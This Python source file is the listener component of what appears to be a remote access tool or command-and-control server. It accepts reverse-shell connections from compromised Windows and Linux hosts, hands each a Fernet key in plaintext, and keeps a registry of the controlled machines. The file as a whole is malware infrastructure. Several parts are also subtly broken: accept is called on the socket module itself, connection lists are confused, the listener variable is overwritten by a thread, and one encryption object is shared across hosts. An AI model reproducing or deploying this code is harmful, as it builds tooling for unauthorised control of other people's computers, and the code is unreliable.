# Reverse Socket TCP Listener
from Utils.ui import *
from Devices import *
class Listener():
    def __init__(self, Server, config):
        self.address = config["address"]
        self.server = Server
        self.port = config["port"]
        #self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        #self.ssl_context.load_cert_chain(certfile="Data/ssl.pem", keyfile="Data/ssl.key")
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.stopped = False
        self.start()
    def decrypt(self, data):
        # Decrypt the data
        return self.fernet.decrypt(data).decode()

    def encrypt(self, data):
        # Encrypt the data
        return self.fernet.encrypt(data.encode())

    def refresh_connections(self):
        # Check if the connections are still alive
        while True:
            # Check if Server is stopped
            if self.stopped:
                exit()
            for Device in self.connections:
                if not Device.alive():
                    self.connections.remove(Device)
                    log(f"Connection to {Device.addr} has been lost.", alert="critical")
            time.sleep(10)


    def listen(self):
        while True:
            # Check if Server stopped
            if self.stopped:
                exit()
            try:
                #with self.context.wrap_socket(self.socket, server_side=True) as socket:
                conn, addr = socket.accept()
            except Exception as e:
                logging.error(e)
                exit()
            else:
                self.key = Fernet.generate_key()
                self.fernet = Fernet(self.key)
                ph_print(f"New Connection established from {addr[0]}")
                logging.info(f"New Connection established from {addr}")
                conn.send(self.key)
                operating_system = self.decrypt(conn.recv(1024)).lower()
                if operating_system == "windows":
                    self.server.connections.append(Windows(conn, addr[0], self.key))
                elif operating_system == "linux":
                    self.server.connections.append(Linux(conn, addr[0], self.key))
                else:
                    log(f"Unknown Operating System: {operating_system}", alert="error")
                    logging.error(f"Unknown Operating System: {operating_system}")
                    conn.close()
                    continue

    def start(self):
        ADDR = (self.address, self.port)
        try:
            self.listener.bind(ADDR)
        except:
            raise Exception("Port is already in use.")
        self.listener.listen()
        # Start the Listener and Refresher
        self.listener = threading.Thread(target=self.listen, name="Listener")
        self.listener.start()
        self.refresher = threading.Thread(target=self.refresh_connections, name="Refresher")
        self.refresher.start()

    def stop(self):
        # Stop the Server
        self.listener.shutdown(socket.SHUT_RDWR)
        self.stopped = True
    def status(self):
        """Get Status of the Server
        
        Returns:
            bool: True if socket is running, False if not
            bool: True if listener is running, False if not
            bool: True if refresher is running, False if not"""
        # Return the Status of the Server
        return self.stopped, self.listener.is_alive(), self.refresher.is_alive()
